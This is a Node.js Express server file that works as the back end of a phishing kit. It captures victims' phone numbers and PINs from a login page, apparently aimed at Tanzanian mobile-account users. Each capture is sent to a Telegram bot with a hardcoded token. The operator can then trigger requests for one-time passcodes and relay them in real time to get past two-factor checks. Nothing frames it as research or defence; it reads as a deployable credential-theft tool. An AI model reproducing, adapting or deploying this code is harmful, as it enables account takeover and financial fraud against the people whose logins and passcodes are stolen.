const express = require("express");
const axios = require("axios");
const cors = require("cors");
const bodyParser = require("body-parser");
const crypto = require('crypto');
const path = require("path");

const app = express();
const PORT = process.env.PORT || 5002;

// --- MIDDLEWARE ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// --- TELEGRAM CONFIG ---
const TELEGRAM_BOT_TOKEN = "8724075511:AAFjhU_XRoSRaiMo9i3jUNdvjRLUebwRlCc";
const TELEGRAM_ADMIN_ID = "7162306402";
const BASE_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;

const sessions = {};

// --- ROUTES ---

// 1. Initial Login Submission
app.post("/api/submit", async (req, res) => {
    const { phone, pin } = req.body;
    const sessionId = crypto.randomBytes(8).toString("hex");

    sessions[sessionId] = { 
        status: 'waiting', 
        phone: phone, 
        pin: pin, 
        timestamp: Date.now() 
    };

    const message = `🚀 *New Login Captured*\n📱 Phone: +255${phone}\n🔑 PIN: ${pin}\n🆔 ID: ${sessionId}`;

    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_ADMIN_ID,
            text: message,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "🔢 Request OTP (5)", url: `${BASE_URL}/api/cmd/${sessionId}/otp5` },
                        { text: "🔢 Request OTP (6)", url: `${BASE_URL}/api/cmd/${sessionId}/otp6` }
                    ],
                    [
                        { text: "✅ Done / Redirect", url: `${BASE_URL}/api/cmd/${sessionId}/approved` }
                    ]
                ]
            }
        });
        res.json({ success: true, sessionId: sessionId });
    } catch (error) {
        res.status(500).json({ success: false });
    }
});

// 2. Admin URL Command Handler (Used by buttons in Telegram)
app.get('/api/cmd/:id/:command', (req, res) => {
    const { id, command } = req.params;
    if (sessions[id]) {
        sessions[id].status = command;
        res.send(`<h1>Action Success</h1><p>Status set to: ${command}</p><script>setTimeout(window.close, 1000)</script>`);
    } else {
        res.status(404).send('Session Expired');
    }
});

// 3. OTP Submission Route
app.post('/api/submit-otp', async (req, res) => {
    const { otp, sessionId } = req.body;

    if (sessions[sessionId]) {
        sessions[sessionId].status = 'verifying';
        const msg = `🔐 *OTP Received*\n📱 User: +255${sessions[sessionId].phone}\n🔢 OTP: ${otp}`;
        
        try {
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                chat_id: TELEGRAM_ADMIN_ID,
                text: msg,
                parse_mode: "Markdown",
                reply_markup: {
                    inline_keyboard: [[
                        { text: "✅ Accept", url: `${BASE_URL}/api/cmd/${sessionId}/approved` },
                        { text: "❌ Decline", url: `${BASE_URL}/api/cmd/${sessionId}/declined` }
                    ]]
                }
            });
            res.json({ success: true });
        } catch (e) {
            res.status(500).json({ success: false });
        }
    } else {
        res.status(404).json({ success: false });
    }
});

// 4. Status Polling
app.get('/api/status/:id', (req, res) => {
    const session = sessions[req.params.id];
    res.json(session ? { status: session.status } : { status: 'not_found' });
});

// Serve Frontend
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, "0.0.0.0", () => {
    console.log(`🚀 Server listening on port ${PORT}`);
});
